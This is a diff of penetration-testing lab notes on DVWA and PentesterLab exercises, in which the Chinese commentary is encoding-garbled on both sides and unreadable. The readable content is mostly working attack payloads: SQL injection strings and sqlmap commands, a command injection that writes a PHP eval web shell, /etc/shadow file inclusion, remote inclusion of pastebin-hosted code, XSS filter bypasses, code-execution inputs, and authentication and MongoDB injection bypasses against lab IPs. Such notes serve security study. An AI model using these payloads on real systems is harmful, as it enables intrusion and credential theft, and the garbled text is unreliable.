@@ -1,16 +1,16 @@
-°Ğ³¡IP£º60.219.238.35
+ï»¿é¶åœºIPï¼š60.219.238.35
 DVWA
 {
-Ò»¡¢brute force
+ä¸€ã€brute force
 1.low 
-Ö±½Ó´øÈëburp×¥°üÆÆ½â
+ç›´æ¥å¸¦å…¥burpæŠ“åŒ…ç ´è§£
 
 2.medium
-ÍòÄÜÃÜÂë¡¢±©Á¦ÆÆ½â
+ä¸‡èƒ½å¯†ç ã€æš´åŠ›ç ´è§£
 
 3.high
-user-token·À±¬ÆÆ
-	Ô´´úÂë£º	
+user-tokené˜²çˆ†ç ´
+	æºä»£ç ï¼š	
 Brute Force Source
 <?php
 
@@ -56,7 +56,7 @@ generateSessionToken();
 ?>
 
 
-±íµ¥£º
+è¡¨å•ï¼š
 		<form action="#" method="GET">
 			Username:<br />
 			<input type="text" name="username"><br />
@@ -67,53 +67,53 @@ generateSessionToken();
 			<input type='hidden' name='user_token' value='7512b884cbe9d6a475b9a87ad2f6d139' />
 		</form>
 		
-	python½Å±¾ÆÆ½â	
+	pythonè„šæœ¬ç ´è§£	
 4.impossible
 
-¶ş¡¢ÃüÁîÖ´ĞĞ
+äºŒã€å‘½ä»¤æ‰§è¡Œ
 1.low
-&,&&,||,|£¬>>
+&,&&,||,|ï¼Œ>>
 whoami
 pwd
-ÖØ¶¨Ïò£º&echo hello >> 1.txt
+é‡å®šå‘ï¼š&echo hello >> 1.txt
 192.168.1.1 & echo "<?php eval($_POST['123']);?>" >> 1.php
 2.medium
-»»ĞĞ%0D¡¢%OAÈÆ¹ı¹ıÂË,¹ÜµÀ·û|
+æ¢è¡Œ%0Dã€%OAç»•è¿‡è¿‡æ»¤,ç®¡é“ç¬¦|
 3.high
-¹ÜµÀ·û|
+ç®¡é“ç¬¦|
 
-4.Ò»¾ä»°Ä¾Âí
+4.ä¸€å¥è¯æœ¨é©¬
 
-Èı¡¢sql×¢Èë
-1.lowÎŞ¹ıÂË
-Óï¾ä£º1' or 1=1 #
-2.medium POST×¢Èë£¬¹ıÂËÌØÊâ×Ö·û
+ä¸‰ã€sqlæ³¨å…¥
+1.lowæ— è¿‡æ»¤
+è¯­å¥ï¼š1' or 1=1 #
+2.medium POSTæ³¨å…¥ï¼Œè¿‡æ»¤ç‰¹æ®Šå­—ç¬¦
 http://localhost/dvwa-1.9/vulnerabilities/sqli/#
 id=1  union select user(),2&Submit=Submit
-3.high ÊÖ¹¤×¢Èë
-session£¬»»Ò³Ãæ·À¹¤¾ß×¢Èë
-4.×¢Èë¹¤¾ß
+3.high æ‰‹å·¥æ³¨å…¥
+sessionï¼Œæ¢é¡µé¢é˜²å·¥å…·æ³¨å…¥
+4.æ³¨å…¥å·¥å…·
 sqlmap
-pangolin¡¢havij
-°¡D¡¢Ã÷Ğ¡×Ó
+pangolinã€havij
+å•ŠDã€æ˜å°å­
 navicat
 
-ËÄ¡¢ÎÄ¼ş°üº¬
+å››ã€æ–‡ä»¶åŒ…å«
 1.low
-Ö±½ÓÔ¶³Ì°üº¬
-±¾µØ°üº¬/etc/shadow
-±¾µØ°üº¬Ãô¸ĞÎÄ¼ş
+ç›´æ¥è¿œç¨‹åŒ…å«
+æœ¬åœ°åŒ…å«/etc/shadow
+æœ¬åœ°åŒ…å«æ•æ„Ÿæ–‡ä»¶
 2.medium
-Ô¶³Ìstr_place¹ıÂËhttp://¡¢https://
-±¾µØ¹ıÂË../
-Ô¶³Ì°üº¬Ê¹ÓÃË«Ğ´ÈÆ¹ıÌæ»»hthttp://tp://
-±¾µØ°üº¬Ê¹ÓÃ¾ø¶ÔÂ·¾¶C:/
+è¿œç¨‹str_placeè¿‡æ»¤http://ã€https://
+æœ¬åœ°è¿‡æ»¤../
+è¿œç¨‹åŒ…å«ä½¿ç”¨åŒå†™ç»•è¿‡æ›¿æ¢hthttp://tp://
+æœ¬åœ°åŒ…å«ä½¿ç”¨ç»å¯¹è·¯å¾„C:/
 3.high
-fnmatch:ÎÄ¼şÃûĞèÒªÒÔfile://¿ªÍ·
-½áºÏÉÏ´«Â©¶´£¬°üº¬±¾µØÒ»¾ä»°
+fnmatch:æ–‡ä»¶åéœ€è¦ä»¥file://å¼€å¤´
+ç»“åˆä¸Šä¼ æ¼æ´ï¼ŒåŒ…å«æœ¬åœ°ä¸€å¥è¯
 4.impossible
 
-Îå¡¢XSS-reflect
+äº”ã€XSS-reflect
 1.low
 <script>alert(1)</script>
 2.medium
@@ -122,13 +122,13 @@ fnmatch:ÎÄ¼şÃûĞèÒªÒÔfile://¿ªÍ·
 <img src=1 onerror="alert(1)">
 4.impossible
 
-Áù¡¢XSS-store
+å…­ã€XSS-store
 1.low
 <script>alert(1)</script>
 2.medium
 <scRIpt>alert(1)</script>
 3.high
-¹ıÂËscript±êÇ©
+è¿‡æ»¤scriptæ ‡ç­¾
 <img src=1 onerror="alert(1)">
 4.impossible
 }
@@ -140,90 +140,90 @@ sqlin
 
 pentesterlabI
 {
-µØÖ·£ºhttp://218.9.118.151:5677
-	sql×¢Èë£º
+åœ°å€ï¼šhttp://218.9.118.151:5677
+	sqlæ³¨å…¥ï¼š
 	{
-	1.×Ö·ûĞÍ×¢Èë
-		ÊÖ¹¤£º
+	1.å­—ç¬¦å‹æ³¨å…¥
+		æ‰‹å·¥ï¼š
 		' and '1'='1
-		' and 1=1 %23(»ò#»ò-- 1234)
+		' and 1=1 %23(æˆ–#æˆ–-- 1234)
 		sqlmap:sqlmap.py -u http://10.0.1.137/sqli/example1.php?name=root
-	2.¹ıÂË¿Õ¸ñ£¨\t,%09,+)
+	2.è¿‡æ»¤ç©ºæ ¼ï¼ˆ\t,%09,+)
 		'%09and%091=1%09%23
 		sqlmap:sqlmap.py -u http://10.0.1.137/sqli/example2.php?name=root --tamper tamper/space2comment.py
-	3.¹ıÂË¿Õ¸ñ¡¢tabµÈ¼ü
-		×¢ÊÍ·ûÌæ´ú/**/
+	3.è¿‡æ»¤ç©ºæ ¼ã€tabç­‰é”®
+		æ³¨é‡Šç¬¦æ›¿ä»£/**/
 		sqlmap:sqlmap.py -u http://10.0.1.137/sqli/example3.php?name=root --tamper tamper/space2comment.py
-	4.¼òµ¥Êı×ÖĞÍ×¢Èë
+	4.ç®€å•æ•°å­—å‹æ³¨å…¥
 		mysql_real_escape_string
-		Ö±½Ó×¢Èë
+		ç›´æ¥æ³¨å…¥
 		sqlmap:sqlmap.py -u http://10.0.1.137/sqli/example5.php?id=4
 	5.preg_match('/~[0-9]+/',$_GET['id'])
-		ÒÔÊı×Ö¿ªÍ·
+		ä»¥æ•°å­—å¼€å¤´
 		sqlmap:sqlmap.py -u http://10.0.1.137/sqli/example5.php?id=2
 	6.preg_match('/~[0-9]+$/',$_GET['id'])
-		ÒÔÊı×Ö½áÎ²
+		ä»¥æ•°å­—ç»“å°¾
 		sqlmap:sqlmap.py -u http://10.0.1.137/sqli/example6.php?id=2 --suffix="%23 123"
 	7.preg_match('/~-?[0-9]+$/m',$_GET['id'])
-		»»ĞĞ·ûÈÆ¹ı
+		æ¢è¡Œç¬¦ç»•è¿‡
 		123%0Apayload
 		sqlmap:sqlmap.py -u http://10.0.1.137/sqli/example7.php?id=2 --prefix="123%0A"
-	8.order by ×¢Èë
-		order by ²»¿ÉÒÔÌ×ÓÃµ¥Ë«ÒıºÅ
-		·´µ¥ÒıºÅÊ±¼äÑÓ³Ù×¢Èë
+	8.order by æ³¨å…¥
+		order by ä¸å¯ä»¥å¥—ç”¨å•åŒå¼•å·
+		åå•å¼•å·æ—¶é—´å»¶è¿Ÿæ³¨å…¥
 		order by `name`,1  #
 		name` desc %23
 		sqlmap:
 		sqlmap.py -u 10.0.1.137/sqli/example8.php?order=name --prefix="` " --suffix=" %23" --level 3 --tables -v 3
 		Payload: order=name`  RLIKE (SELECT (CASE WHEN (7239=7239) THEN 0x6e616d65 ELSE 0x28 END)) #
-	9.boolĞÍÃ¤×¢
-	ÊÖ¹¤£ºif(0,age,name)
+	9.boolå‹ç›²æ³¨
+	æ‰‹å·¥ï¼šif(0,age,name)
 	sqlmap:
 	    Payload: order=(SELECT (CASE WHEN (9442=9442) THEN 9442 ELSE 9442*(SELECT 9442 FROM INFORMATION_SCHEMA.PLUGINS) END))
 	}	
-	ÎÄ¼ş°üº¬£º
+	æ–‡ä»¶åŒ…å«ï¼š
 	{
 		example1:
-			Ô¶³ÌÎÄ¼ş°üº¬
+			è¿œç¨‹æ–‡ä»¶åŒ…å«
 			http://10.0.1.137/fileincl/example2.php?page=https://pastebin.com/raw/7vMVxa9Y
 		example2:
-			³ÌĞò×Ô¶¯ÎªÁ´½Ó¼Ó.php,ĞèÒªÍ¨¹ı#Ãªµã×¢ÊÍµôºóÃæµÄÄÚÈİ
+			ç¨‹åºè‡ªåŠ¨ä¸ºé“¾æ¥åŠ .php,éœ€è¦é€šè¿‡#é”šç‚¹æ³¨é‡Šæ‰åé¢çš„å†…å®¹
 			http://10.0.1.137/fileincl/example2.php?page=https://pastebin.com/raw/7vMVxa9Y%23
 	}	
 	XSS:
 	{
-		ex1:ÎŞ¹ıÂË
+		ex1:æ— è¿‡æ»¤
 			<script>alert(1)</script>
-		ex2:¹ıÂË<script>¡¢</script>
-			Î´¹ıÂË´óĞ¡Ğ´
+		ex2:è¿‡æ»¤<script>ã€</script>
+			æœªè¿‡æ»¤å¤§å°å†™
 			<sCript>alert(1)</sCript>
-		ex3:¹ıÂË<script>¡¢</script>£¬°üÀ¨´óĞ¡Ğ´
+		ex3:è¿‡æ»¤<script>ã€</script>ï¼ŒåŒ…æ‹¬å¤§å°å†™
 			<img src="" onerror="alert(1)">
 		ex4:
 			<img src="" onerror="alert(1)">
-		ex5:¹ıÂËalert
+		ex5:è¿‡æ»¤alert
 			<script>eval(string.fromCharCode(97,108,101,114,116,40,48,41))</script>
 			<img src="" onerror="confirm(1)">
-			alert()¡¢confirm()¡¢prompt()
-		ex6:½«´«ÈëµÄ²ÎÊıÖ±½Ó´«ÈëSCRIPTÄÚµÄ±äÁ¿
+			alert()ã€confirm()ã€prompt()
+		ex6:å°†ä¼ å…¥çš„å‚æ•°ç›´æ¥ä¼ å…¥SCRIPTå†…çš„å˜é‡
 			1";alert(1);"
-		ex7:½«´«ÈëµÄ²ÎÊıÖ±½Ó´«ÈëSCRIPTÄÚµÄ±äÁ¿
+		ex7:å°†ä¼ å…¥çš„å‚æ•°ç›´æ¥ä¼ å…¥SCRIPTå†…çš„å˜é‡
 			1';alert(1);'
 		ex8:htmlspecialchars
-			·ÃÎÊexample8.php/payload,¿ÉÖ±½Ó´øÈëexample8.php
+			è®¿é—®example8.php/payload,å¯ç›´æ¥å¸¦å…¥example8.php
 			http://10.0.1.137/xss/example8.php/%22%3E%3Cscript%3Ealert(1)%3C/script%3E%3C!--
 			http://10.0.1.137/xss/example8.php/"><script>alert(1)</script><form action=" 
-		ex9:Ãªµã
+		ex9:é”šç‚¹
 			document.write(location.hash.substring(1));
-			²»Í¬ä¯ÀÀÆ÷Ö§³Ö²»Í¬:#<script>alert(1)</script>
+			ä¸åŒæµè§ˆå™¨æ”¯æŒä¸åŒ:#<script>alert(1)</script>
 	}
 	
 	
 	
-	´úÂëÖ´ĞĞ
+	ä»£ç æ‰§è¡Œ
 	{
 		example1:
-			×Ö·û´®Á¬½Ó·û
+			å­—ç¬¦ä¸²è¿æ¥ç¬¦
 			http://218.9.118.151:5677/codeexec/example1.php?name=hacker".phpinfo();//
 			http://218.9.118.151:5677/codeexec/example1.php?name=hacker".phpinfo();$dummy="
 			
@@ -249,55 +249,55 @@ pentesterlabI
 
 pentesterlabII
 {
-	²Î¿¼ÎÄµµ
+	å‚è€ƒæ–‡æ¡£
 		http://blog.csdn.net/qq_32400847/article/details/54425379
 		https://pentesterlab.com/exercises/web_for_pentester_II/course
-	Á·Ï°µØÖ·£º
+	ç»ƒä¹ åœ°å€ï¼š
 		http://60.219.238.35:5678/
-	´ğ°¸½âÎö
+	ç­”æ¡ˆè§£æ
 	{
-		sql×¢Èë£º
+		sqlæ³¨å…¥ï¼š
 		{
-			1.ÍòÄÜÃÜÂë
+			1.ä¸‡èƒ½å¯†ç 
 			payload:http://60.219.238.35:5678/sqlinjection/example1/?username=admin' or 1=1 %23&password=1&submit=%E6%8F%90%E4%BA%A4%E6%9F%A5%E8%AF%A2
 		
-			2.±¨´íĞÍ×¢Èë
-			payload:60.219.238.35:5678/sqlinjection/example2/?username='+union+select+1,2,3%23&password=&submit=Ìá½»²éÑ¯
+			2.æŠ¥é”™å‹æ³¨å…¥
+			payload:60.219.238.35:5678/sqlinjection/example2/?username='+union+select+1,2,3%23&password=&submit=æäº¤æŸ¥è¯¢
 			
-			3.¹ıÂË'
-			±ÕºÏÈÆ¹ı'
+			3.è¿‡æ»¤'
+			é—­åˆç»•è¿‡'
 			http://60.219.238.35:5678/sqlinjection/example3/?username=\&password=' or 1=1 %23&submit=%E6%8F%90%E4%BA%A4%E6%9F%A5%E8%AF%A2
 			
-			4.where×Ö¶ÎÖ±½Ó²éÑ¯
+			4.whereå­—æ®µç›´æ¥æŸ¥è¯¢
 			select * from users where [req content]
 			and extractvalue(1, concat(0x5e7e5e,(select concat(table_name) from information_schema.tables where table_schema=database() limit 0,1)))#		//table_name
 			and extractvalue(1, concat(0x5e7e5e,(select concat(column_name) from information_schema.columns where table_schema=database() limit 2,1)))#		//column_name
 			and extractvalue(1, concat(0x5e7e5e,(select concat(password) from users limit 0,1)))#
 			and extractvalue(1, concat(0x5e7e5e,(select concat(id,username,password) from users limit 0,1)))#
-			and extractvalue(1, concat((select concat(password) from users limit 3,1)))#  //×¢³öÃÜÂë
+			and extractvalue(1, concat((select concat(password) from users limit 3,1)))#  //æ³¨å‡ºå¯†ç 
 			1ed2b44c2f006040e34205455226e695
 			
-			5.×¢ÈëµãÎªlimit=3
+			5.æ³¨å…¥ç‚¹ä¸ºlimit=3
 			union select database(),USER(),3
 			sqlmap.py -u http://60.219.238.35:5678/sqlinjection/example5/?limit=1
 			
-			6.×¢ÈëµãÎªgroup
+			6.æ³¨å…¥ç‚¹ä¸ºgroup
 			union select 1,2,3
 			http://60.219.238.35:5678/sqlinjection/example6/?group=username%20union%20select%20database(),user(),3
 			
-			7.»ùÓÚÊ±¼äÀ´×¢Èë
-			²éÑ¯Óï¾ä£ºSELECT * FROM users WHERE id=1 order by 10 
+			7.åŸºäºæ—¶é—´æ¥æ³¨å…¥
+			æŸ¥è¯¢è¯­å¥ï¼šSELECT * FROM users WHERE id=1 order by 10 
 			and if(length(database())=21,sleep(3),0)
 			sqlmap.py -u http://60.219.238.35:5678/sqlinjection/example7/?id=1
 		
-			8.¶ş´Î×¢Èë
+			8.äºŒæ¬¡æ³¨å…¥
 			a' union select 1,2,3%23
 			a' union select database(),user(),3#
 			http://60.219.238.35:5678/sqlinjection/example8/
 			pentesterlab@localhost
 			sqlinjection_example8
 			
-			9.¿í×Ö·û×¢Èë
+			9.å®½å­—ç¬¦æ³¨å…¥
 			http://60.219.238.35:5678/sqlinjection/example9/?username=admin%df%27 or 1=1%23&password=&submit=%E6%8F%90%E4%BA%A4%E6%9F%A5%E8%AF%A2
 			
 			def sql9():
@@ -316,80 +316,80 @@ pentesterlabII
 		
 		}
 		
-		Authentication£º
+		Authenticationï¼š
 		{
-			1.Èõ¿ÚÁî http basicÈÏÖ¤
+			1.å¼±å£ä»¤ http basicè®¤è¯
 			http://60.219.238.35:5678/authentication/example1/
-			2.×Öµä±©ÆÆ¡¢×Ö·û´®µÄ¶Ô±È
+			2.å­—å…¸æš´ç ´ã€å­—ç¬¦ä¸²çš„å¯¹æ¯”
 			hacker,p4ssw0rd
-			3.cookieÑéÖ¤
+			3.cookieéªŒè¯
 			http://60.219.238.35:5678/authentication/example3/
-			ĞŞ¸ÄcookieÎªadmin
+			ä¿®æ”¹cookieä¸ºadmin
 			
-			4.cookieÑéÖ¤£¬MD5¼ÓÃÜ
-			ĞŞ¸ÄcookieÎª£º21232f297a57a5a743894a0e4a801fc3
-			5.ÓÃ»§ÃûÃÜÂëÑéÖ¤
-			ÔÚMySQLÖĞ´óĞ¡Ğ´²»Ãô¸ĞÈÆ¹ı
-			×¢²áÒ»¸öAdmin
+			4.cookieéªŒè¯ï¼ŒMD5åŠ å¯†
+			ä¿®æ”¹cookieä¸ºï¼š21232f297a57a5a743894a0e4a801fc3
+			5.ç”¨æˆ·åå¯†ç éªŒè¯
+			åœ¨MySQLä¸­å¤§å°å†™ä¸æ•æ„Ÿç»•è¿‡
+			æ³¨å†Œä¸€ä¸ªAdmin
 			
-			6.ÓÃ»§ÃûÃÜÂëÑéÖ¤
-			¹ıÂË´óĞ¡Ğ´
-			ºóÃæ¼Ó¿Õ¸ñÀà·ûºÅÈÆ¹ı£ºspace,+,\t
+			6.ç”¨æˆ·åå¯†ç éªŒè¯
+			è¿‡æ»¤å¤§å°å†™
+			åé¢åŠ ç©ºæ ¼ç±»ç¬¦å·ç»•è¿‡ï¼šspace,+,\t
 		}
 		
 		Captcha
 		{
-			1.Ğé¼ÙÑéÖ¤
-			×¥°ü£¬É¾³ıÁ´½ÓÖĞcaptcha=1
+			1.è™šå‡éªŒè¯
+			æŠ“åŒ…ï¼Œåˆ é™¤é“¾æ¥ä¸­captcha=1
 			
-			2.formÖĞÓĞcaptcha
+			2.formä¸­æœ‰captcha
 			<form action="submit" action="get">
 				<img src="captcha.png?t=1500390283.0342271"/ > 
 				Answer: <input type="text" name="captcha"/>
 				<input type="hidden" name="answer" value="SIDc_rKUXd"/>
 				<input type="submit" name="submit"/>
 			</form>
-			pyÇëÇó±íµ¥£¬ÕıÔòÆ¥Åä£¬²¶»ñcaptcha
+			pyè¯·æ±‚è¡¨å•ï¼Œæ­£åˆ™åŒ¹é…ï¼Œæ•è·captcha
 			
-			3.´Ócookie¶ÁÈ¡captcha
-			py¶ÁÈ¡cookie
+			3.ä»cookieè¯»å–captcha
+			pyè¯»å–cookie
 			
-			4.ÕâµÀÌâÆäÊµ²¢Ã»ÓĞÀí½âÊÇÊ²Ã´ÒâË¼¡£¹Ù·½½â´ğÊÇ²»±ØÕæÕıµÄ±©ÆÆÑéÖ¤Âë£¬Ö»ĞèÒªÆÆ½âÒ»´ÎÈ»ºó¿ÉÒÔÖØ¸´Ê¹ÓÃÏàÍ¬µÄÖµºÍsessionid¡£
+			4.è¿™é“é¢˜å…¶å®å¹¶æ²¡æœ‰ç†è§£æ˜¯ä»€ä¹ˆæ„æ€ã€‚å®˜æ–¹è§£ç­”æ˜¯ä¸å¿…çœŸæ­£çš„æš´ç ´éªŒè¯ç ï¼Œåªéœ€è¦ç ´è§£ä¸€æ¬¡ç„¶åå¯ä»¥é‡å¤ä½¿ç”¨ç›¸åŒçš„å€¼å’Œsessionidã€‚
 			
-			5.¶àÌá½»¼¸´Î£¬¾Í»á·¢ÏÖÕâ¸öÑéÖ¤ÂëÑù±¾ºÜÉÙ¡£ÎÒÃÇ¿ÉÒÔ°ÑËü¶¼±£´æÏÂÀ´£¬È»ºóÃ¿´ÎÓÃÑéÖ¤ÂëÓë±£´æÏÂÀ´µÄ×ö¶Ô±È¡£ÏÈÌáÇ°°ÑËùÓĞÎÄ¼ş±£´æÔÚ´úÂëÄ¿Â¼µÄpicÎÄ¼ş¼ĞÀï£¬ÎÄ¼şÃûÊÇÑéÖ¤ÂëµÄÄÚÈİ
+			5.å¤šæäº¤å‡ æ¬¡ï¼Œå°±ä¼šå‘ç°è¿™ä¸ªéªŒè¯ç æ ·æœ¬å¾ˆå°‘ã€‚æˆ‘ä»¬å¯ä»¥æŠŠå®ƒéƒ½ä¿å­˜ä¸‹æ¥ï¼Œç„¶åæ¯æ¬¡ç”¨éªŒè¯ç ä¸ä¿å­˜ä¸‹æ¥çš„åšå¯¹æ¯”ã€‚å…ˆæå‰æŠŠæ‰€æœ‰æ–‡ä»¶ä¿å­˜åœ¨ä»£ç ç›®å½•çš„picæ–‡ä»¶å¤¹é‡Œï¼Œæ–‡ä»¶åæ˜¯éªŒè¯ç çš„å†…å®¹
 			
-			7.µÚÁùÌâÓëµÚÆßÌâ¶¼¿ÉÒÔÓÃtesseractÀ´Ê¶±ğ£¬²»ĞèÒª×öÆäËüµÄ²Ù×÷¡£µÚÁùÌâµÄÊ¶±ğÂÊ±È½Ï¸ß£¬µÚÆßÌâµÄÊ¶±ğÂÊ±È½ÏµÍ£¬¿ÉÒÔ¶àÊÔ¼¸´Î¡£
+			7.ç¬¬å…­é¢˜ä¸ç¬¬ä¸ƒé¢˜éƒ½å¯ä»¥ç”¨tesseractæ¥è¯†åˆ«ï¼Œä¸éœ€è¦åšå…¶å®ƒçš„æ“ä½œã€‚ç¬¬å…­é¢˜çš„è¯†åˆ«ç‡æ¯”è¾ƒé«˜ï¼Œç¬¬ä¸ƒé¢˜çš„è¯†åˆ«ç‡æ¯”è¾ƒä½ï¼Œå¯ä»¥å¤šè¯•å‡ æ¬¡ã€‚
 			
-			8.ÑéÖ¤ÂëĞèÒª×öÒ»Ğ©´¦Àí£¬ÏÈ·ÅÔÚÕâÀïÒÔºóÔÙ×ö
+			8.éªŒè¯ç éœ€è¦åšä¸€äº›å¤„ç†ï¼Œå…ˆæ”¾åœ¨è¿™é‡Œä»¥åå†åš
 			
-			9.ÑéÖ¤ÂëÊÇÌâ½â²¢ÇÒ²»ÊÇĞ´ÔÚÍ¼Æ¬ÉÏµÄ£¬¿ÉÒÔÖ±½ÓÕıÔòÆ¥Åä³öÀ´È»ºó¼ÆËãÊ¶±ğÌá½»
+			9.éªŒè¯ç æ˜¯é¢˜è§£å¹¶ä¸”ä¸æ˜¯å†™åœ¨å›¾ç‰‡ä¸Šçš„ï¼Œå¯ä»¥ç›´æ¥æ­£åˆ™åŒ¹é…å‡ºæ¥ç„¶åè®¡ç®—è¯†åˆ«æäº¤
 		}
 		
 		Authorization
 		{
-			1.Î´ÊÚÈ¨·ÃÎÊ
+			1.æœªæˆæƒè®¿é—®
 			http://60.219.238.35:5678/authorization/example1/infos/1
 			
-			2.Ë®Æ½È¨ÏŞÌáÉı
+			2.æ°´å¹³æƒé™æå‡
 			http://60.219.238.35:5678/authorization/example2/infos/3
 			
-			3.Ê¹ÓÃuser1µÄÕÊ»§·ÃÎÊuser2µÄÄÚÈİ
+			3.ä½¿ç”¨user1çš„å¸æˆ·è®¿é—®user2çš„å†…å®¹
 			http://60.219.238.35:5678/authorization/example3/infos/edit/3
 		}
 		
 		Mass Assignment
 		{
-			Ô­Àí£º¶ÔÏó¹ØÏµÓ³Éä(Object-relational mapping)ÒÔ·½±ã²»¶®sqlµÄ¿ª·¢ÈËÔ±À´×öÊı¾İ¿âµÄ²Ù×÷¡£
-				ÔÚrubyÖĞ£¬¿ÉÒÔÓÃ@user=User.find_by_name('pentesterlab')À´½øĞĞÊı¾İ¿âµÄ²éÑ¯Óë½á¹ûµÄ·µ»Ø£¬³ı´ËÖ®Íâ»¹ÓĞ´´½¨Óë¸üĞÂµÈ²Ù×÷¡£
-				µ«Õâ²¢²»ÄÜ±£Ö¤°²È«ĞÔ£¬Èç¹û¿ª·¢ÈËÔ±Ã»ÓĞ¶Ô²ÎÊı×öºÃÅĞ¶Ï£¬¾Í»á³öÏÖÖØÖÃÄ³Ğ©ÊôĞÔµÄÎÊÌâ£¬Õâ¾ÍÊÇ¸²¸ÇÊôĞÔ¡£
+			åŸç†ï¼šå¯¹è±¡å…³ç³»æ˜ å°„(Object-relational mapping)ä»¥æ–¹ä¾¿ä¸æ‡‚sqlçš„å¼€å‘äººå‘˜æ¥åšæ•°æ®åº“çš„æ“ä½œã€‚
+				åœ¨rubyä¸­ï¼Œå¯ä»¥ç”¨@user=User.find_by_name('pentesterlab')æ¥è¿›è¡Œæ•°æ®åº“çš„æŸ¥è¯¢ä¸ç»“æœçš„è¿”å›ï¼Œé™¤æ­¤ä¹‹å¤–è¿˜æœ‰åˆ›å»ºä¸æ›´æ–°ç­‰æ“ä½œã€‚
+				ä½†è¿™å¹¶ä¸èƒ½ä¿è¯å®‰å…¨æ€§ï¼Œå¦‚æœå¼€å‘äººå‘˜æ²¡æœ‰å¯¹å‚æ•°åšå¥½åˆ¤æ–­ï¼Œå°±ä¼šå‡ºç°é‡ç½®æŸäº›å±æ€§çš„é—®é¢˜ï¼Œè¿™å°±æ˜¯è¦†ç›–å±æ€§ã€‚
 				
-			1. Ä¿µÄÊÇ´´½¨¸öadminÈ¨ÏŞµÄÓÃ»§¡£¹Û²ì²ÎÊı£¬·¢ÏÖÊÇuser[username]=&user[password]= ÄÇÃ´ÎÒÃÇÊÔ×ÅÌí¼ÓÒ»¸öadmin ÊôĞÔ¡£
+			1. ç›®çš„æ˜¯åˆ›å»ºä¸ªadminæƒé™çš„ç”¨æˆ·ã€‚è§‚å¯Ÿå‚æ•°ï¼Œå‘ç°æ˜¯user[username]=&user[password]= é‚£ä¹ˆæˆ‘ä»¬è¯•ç€æ·»åŠ ä¸€ä¸ªadmin å±æ€§ã€‚
 				http://p0.qhimg.com/t013e9912e9c8a617df.png
 
-			2. Ä¿µÄÍ¬1Ò»Ñù£¬´´½¨Ò»¸öadminÈ¨ÏŞµÄÓÃ»§¡£µ«ÊÇÔÚ´´½¨Ê±²¢²»ĞĞ¡£ÄÇÃ´ÎÒÃÇ´´½¨Ò»¸öÆÕÍ¨ÓÃ»§½øÈ¥£¬·¢ÏÖÓĞÒ»¸ö¸üĞÂ¼òÀú£¬ÄÇÃ´ÔÚ¸üĞÂ´¦Ìí¼ÓadminÊôĞÔ¾Í¿ÉÒÔ¡£
+			2. ç›®çš„åŒ1ä¸€æ ·ï¼Œåˆ›å»ºä¸€ä¸ªadminæƒé™çš„ç”¨æˆ·ã€‚ä½†æ˜¯åœ¨åˆ›å»ºæ—¶å¹¶ä¸è¡Œã€‚é‚£ä¹ˆæˆ‘ä»¬åˆ›å»ºä¸€ä¸ªæ™®é€šç”¨æˆ·è¿›å»ï¼Œå‘ç°æœ‰ä¸€ä¸ªæ›´æ–°ç®€å†ï¼Œé‚£ä¹ˆåœ¨æ›´æ–°å¤„æ·»åŠ adminå±æ€§å°±å¯ä»¥ã€‚
 				http://p8.qhimg.com/t017d691557d755ff26.png
 			
-			3. Í¬Ç°2¸ö²î²»¶à£¬µ«ÊÇÕâÀïÒª²ÂÒ»¸öcompany_idµÄ×Ö¶Î¡£ÒòÎªÔÚÒ»¶Ô¶àµÄ½á¹¹ÖĞ£¬¼´Ò»¸öcompany¶ÔÓ¦¶à¸öuser£¬ÄÇÃ´ÔÚuser±íÖĞ»á¶àÒ»¸öcompany_idµÄÍâ¼üÖ¸Ïòcompany±í¡£
+			3. åŒå‰2ä¸ªå·®ä¸å¤šï¼Œä½†æ˜¯è¿™é‡Œè¦çŒœä¸€ä¸ªcompany_idçš„å­—æ®µã€‚å› ä¸ºåœ¨ä¸€å¯¹å¤šçš„ç»“æ„ä¸­ï¼Œå³ä¸€ä¸ªcompanyå¯¹åº”å¤šä¸ªuserï¼Œé‚£ä¹ˆåœ¨userè¡¨ä¸­ä¼šå¤šä¸€ä¸ªcompany_idçš„å¤–é”®æŒ‡å‘companyè¡¨ã€‚
 				http://p5.qhimg.com/t0146e54734460b0914.png
 			
 		}
@@ -401,13 +401,13 @@ pentesterlabII
 		
 		MongoDB injection
 		{
-			1.¹¹ÔìÕæÖµµÈÊ½ÈÆ¹ıÃÜÂëÑéÖ¤
+			1.æ„é€ çœŸå€¼ç­‰å¼ç»•è¿‡å¯†ç éªŒè¯
 			http://60.219.238.35:5678/mongodb/example1/?username=hacker' || 1==1//&password=hacker
 			
-			2.×¢Èëpassword×Ö¶Î
+			2.æ³¨å…¥passwordå­—æ®µ
 			60.219.238.35:5678/mongodb/example2/?search=admin' && this.password.match(/./)//+%00
-			python½Å±¾£º
-			ÃÜÂë£ºicanhazpassw0rd
+			pythonè„šæœ¬ï¼š
+			å¯†ç ï¼šicanhazpassw0rd
 		}
 	}
 }
